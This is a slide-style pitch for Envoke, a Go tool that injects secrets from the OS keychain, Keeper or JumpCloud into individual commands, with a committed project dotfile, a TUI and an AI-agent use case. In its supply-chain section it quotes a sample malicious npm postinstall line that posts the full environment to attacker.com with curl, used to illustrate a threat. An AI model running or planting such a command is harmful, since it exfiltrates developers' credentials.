Envoke
Secrets management for your whole team
Tags: tools, developer-experience, secrets

Gerco Dries

* The Problem

Secrets management for local dev is a mess.

- `.env` files get committed accidentally
- `.env.example` files go stale immediately
- Every dev has a different setup
- Our secrets live in Keeper and JumpCloud — envchain doesn't know they exist

Nobody has the same environment. Onboarding is an archaeology project.

* What envchain does

envchain is the right idea, executed narrowly.

	$ envchain myapp-db psql -h $DB_HOST -U $DB_USER

- Stores secrets in the OS keychain
- Injects them as environment variables
- Spawns your command as a subprocess

Clean. Simple. But limited to one namespace, one backend, and no Windows.

* Envoke: envchain, but better

Same mental model. Bigger surface.

- ✅ Windows (Credential Manager), macOS (Keychain), Linux (Secret Service)
- ✅ Keeper Secrets Manager
- ✅ JumpCloud Password Manager
- ✅ Compose multiple namespaces in one run
- ✅ Project-local dotfile — committed to git
- ✅ Secret access protected by whatever your backend enforces — Touch ID, Face ID, MFA, hardware tokens

	$ ee -- make dev

No namespace argument. No flags. The project knows what it needs.

* The Dotfile

`.envoke` lives in your project root and gets committed.

	[[namespace]]
	name = "aws-dev"
	backend = "keeper"

	[[namespace]]
	name = "db-local"
	backend = "keychain"

	[[namespace]]
	name = "stripe-test"
	backend = "jumpcloud"

No secrets. Just the shape of your environment. Safe to commit, useful to review.

* Global + Local Composition

	~/.config/envoke/config.toml    ← your backends, your credentials
	<project>/.envoke               ← what this project needs  (committed)
	<project>/.envoke.local         ← your personal overrides  (gitignored)

The global config is *how* to reach your backends.
The dotfile is *what* this project needs.

A Windows dev and a Mac dev share the same `.envoke`.
Their global configs differ. Their experience doesn't.

* This Is a Team Primitive

envchain is a personal productivity tool.
Envoke is a team contract.

- New dev clones repo, runs `ee -- make dev` — it works
- No "ask Bob which env vars you need"
- No stale `.env.example` to maintain
- Secret surface is visible and reviewable in PRs

The committed dotfile turns secret management from an individual habit
into shared team infrastructure.

* The Credential Theft Problem Is Getting Worse

Supply chain attacks are increasingly targeting developer credentials.

Recent pattern: malicious packages (npm, PyPI, etc.) that exfiltrate environment variables on install.

	$ npm install some-package
	# somewhere in postinstall: curl attacker.com -d "$(env)"

If your secrets live in your shell environment — `.env` sourced in `.bashrc`, `direnv` auto-loading — they're exposed to *every process you run*, including every package you install.

Envoke inverts this: secrets are injected *per command*, not loaded globally.
A compromised dependency only sees what the process it runs in sees. Nothing more.

* The Agent Angle

AI coding agents don't need access to your secret store.

	$ ee -- aider --model claude-sonnet-4-6

Secrets are injected before the agent process starts.
The agent reads `$DB_HOST` from its environment — just like any other program.
It never touches Keeper. Never authenticates to JumpCloud.
No credentials in context. No credential theft surface.

The blast radius for a compromised agent is the process lifetime, not your vault.

* More Than a Runner

`ee` ships with a full TUI for managing your secret environment.

- `ee init` — interactive setup wizard, writes `.envoke` for you
- `ee status` — dashboard: which backends are reachable, which need re-auth
- `ee run` — fuzzy profile picker when you have multiple environments
- `ee edit` — browse and edit secrets without values leaking into shell history

Built with Bubble Tea. Degrades gracefully in CI and piped output.

* Pluggable Backend Architecture

	type Backend interface {
	    Get(namespace, key string) (string, error)
	    Set(namespace, key, value string) error
	    List(namespace string) ([]string, error)
	}

- `OsKeychainBackend` — day one, all platforms
- `KeeperBackend` — Keeper Secrets Manager SDK
- `JumpCloudBackend` — JumpCloud REST API
- `SopsBackend`, `VaultBackend` — future

Add a backend without touching core logic.
New backends are just new interface implementations.

* Why Go

- Single binary, no runtime, no installer
- Cross-compile to Windows/macOS/Linux in one command
- `99designs/keyring` covers all OS keychains out of the box
- Keeper and JumpCloud have Go SDKs
- `BurntSushi/toml` for the dotfile — solid, zero drama

The language gets out of the way. We ship something real in a day.

* Summary

envchain → envoke

- macOS + Linux only → *Windows + macOS + Linux*
- OS keychain only → *Keeper, JumpCloud, OS keychain*
- One namespace per run → *Compose namespaces*
- Individual habit → *Team contract*
- No project context → *Committed dotfile*
- No TUI → *init, status, run, edit*

Same idea. Works for the whole team.
